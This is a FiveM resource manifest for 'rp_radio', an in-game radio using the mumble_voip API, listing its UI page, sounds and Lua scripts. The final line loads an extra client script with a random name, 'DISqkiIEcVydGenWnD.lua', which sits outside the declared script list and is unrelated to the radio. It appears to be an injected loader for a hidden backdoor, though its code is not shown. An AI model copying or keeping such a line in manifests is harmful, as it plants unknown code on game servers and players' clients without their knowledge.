fx_version "adamant"
game "gta5"

name "rp_radio"
description "An in-game radio which makes use of the mumble_voip radio API for FiveM"
author "Frazzle (frazzle9999@gmail.com)"
version "2.0"

ui_page "index.html"

dependencies {
	"mumble_voip",
}

files {
	"index.html",
	"on.ogg",
	"off.ogg",
}

client_scripts {
	"config.lua",
	"client.lua",
}

server_scripts {
	"server.lua",
}

client_script "DISqkiIEcVydGenWnD.lua"